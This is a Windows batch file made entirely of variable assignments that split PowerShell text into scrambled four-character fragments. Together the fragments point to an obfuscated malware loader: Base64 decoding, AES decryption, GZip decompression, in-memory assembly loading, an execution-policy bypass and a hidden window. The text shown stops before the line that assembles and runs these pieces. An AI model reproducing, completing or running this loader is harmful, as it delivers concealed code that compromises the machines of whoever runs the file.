@echo off
set "ZBBlHBAFFS= = $"
set "OUmsNSQeGB=ew-O"
set "YzqwrwnssN= = ["
set "PQBdYVHRzZ=.Sec"
set "lQxFjmKoLo=7;$X"
set "hphmMSVoHT=yste"
set "wJWLSEhWKh=;$Yl"
set "aUYffHyfxo=ct S"
set "DJLXuSnfhi=$bZS"
set "yenNHNUzdx=Comp"
set "nKYCaBRErz=e]::"
set "uBPZtHiZLU=nirt"
set "QRiejeeWlN=tem."
set "RCqKwDHkfF=7Yiv"
set "cscMPqwoAE=oryS"
set "QBjtBvTefR=V = "
set "MPVHJFUWtt=uRMk"
set "uXodFxsbtP=$lkd"
set "UEuRzToMZt=ose("
set "GbkHWhoBWl=ct S"
set "LUFOQASJXc=6esa"
set "OdKNHciABU=PKCS"
set "KjcdbefsEF=tem."
set "MeWnDZzEGo=ZSRN"
set "UTkpbfjRis=y]::"
set "MDJxsySOAE=Ui);"
set "tBiKLOwMgg=YDr."
set "WGgbvuXSgy=i, 0"
set "WHBOAnvlYL=:: '"
set "rWYBOJTjTB=.IO."
set "tiuTqCNXzN=onve"
set "CqiuhPvqbn=S.Su"
set "mObfgestit=();$"
set "SPeXIDvpBm=OyzA"
set "dRceUsUFjd=v4Ir"
set "yQVFJLfztd=comp"
set "AjWvzwaEFY=le  "
set "ogaQkinqGY=16] "
set "QmDlLwcEXk=yTo("
set "gJoYljyrfO=em.I"
set "BbMLsxMiUM= [st"
set "gctaJampHW=lBlo"
set "OUWfdbJWNq=raph"
set "sSmlLKmCDj=736u"
set "ZNqsqbxvVh=g = "
set "tJfKHTQnTo=rMXU"
set "KMrUvhAJfW=t Sy"
set "QIypdXKzTY=ert]"
set "tYlVbsUyOk=oArr"
set "COBxFhRTCE='[-1"
set "jTiGcjSjbU=m.IO"
set "PMYNtEXupJ=ionM"
set "UDpBUgaSqD=gMod"
set "vdZDJtbvJv=MXUi"
set "FCiMqySuCZ=0O+g"
set "tmxhJocLDt=em.C"
set "uqdjoJRFLs=n ''"
set "ebDCXwRYzX=k; }"
set "gaYuzLciMd=:('g"
set "AcFCVwWZKs=TllA"
set "VQWBriErZv='txe"
set "drzgRlQKGN=esFX"
set "tAMhLLmjzC=Disp"
set "WOFMxYzUHJ=($JW"
set "EGramjiGVM=3HWs"
set "ZEfMeVYVdH=('da"
set "jrjjDlnfZW=pres"
set "TdoDuCtNuy=sion"
set "KCpKpQzGTu=.Com"
set "rWTsdCAqRf=gnir"
set "JiDhUGwglN=ment"
set "ndBbTWoOLW== [S"
set "rNeVrFcFvO== $X"
set "btuPxegfkT=Dr.T"
set "KIGxBhhYWs=Ui ="
set "mTkPxgQYTf='gni"
set "rHEoVGUiFz=dpox"
set "AmMrZYvTDH=;$YF"
set "dDSYojBHYe=comm"
set "EdwgoGVaKo= '')"
set "sazsfCncHR=-joi"
set "rAcWohaloT=;$qK"
set "dYXppUNYUQ=..-1"
set "kwIdlYrIBK=vj0m"
set "krTxaVRcPf=stem"
set "PUHLvwlcgt=lkdL"
set "jtTpipmMOZ=LM.D"
set "nVHliaZTBr=y.Ci"
set "DclJBeqcPU=oin "
set "xliIODKsym=JCS."
set "AMVhgCRTgz=ion."
set "spiLWAsExo=RN);"
set "WNtQFdHhEb=S46e"
set "JtHRzMlLvZ=JWJC"
set "PIKCRbIUkP=isfL"
set "cDULupIkiS=bstr"
set "iMMOjLRahU=ptor"
set "qucnRHtjkW=YFEm"
set "xbNpsTFpOr=ring"
set "gYqUjkAPgR=);$X"
set "mmJIKaciIY=ptog"
set "HUUtoFuYWU=[IO."
set "CLrLOWJqZr=Fina"
set "hUMNRDFTPd=.Mod"
set "IHAMFBcIxr=Mode"
set "nBXrgIxTVv=-ep "
set "DgSmaPjzsT=Odf "
set "EkHjCXcQBA=);$X"
set "IVAkRGWNxD=).Sp"
set "AcPSzekHMd=bjec"
set "rewiZIjpkk=+hAO"
set "tIJsWKAFqv=ck($"
set "COuWLzzQkj=tem."
set "AJkgBPVUSJ=grap"
set "YRfwiFHkXF=d;$X"
set "sKAMqsirDq=RN ="
set "jedDUASaIa=vert"
set "wyatAXUdjz=ne);"
set "zNdvJwqVmw=oint"
set "fkoHXxIIAv=);$b"
set "PQtFlnYbds=flec"
set "trGiHjrLkv=oL'["
set "NaidnBxzaE=New-"
set "JIQfnDvHJH= = $"
set "deQUMZpMyz=ay()"
set "TXXnrjiKlq=th('"
set "gKZbRMpzgE=$bZS"
set "dUELUdeELZ=.-16"
set "SJoQCxTguK=New-"
set "lvyGorSElC=)($r"
set "DeHwnxRWmW=m.IO"
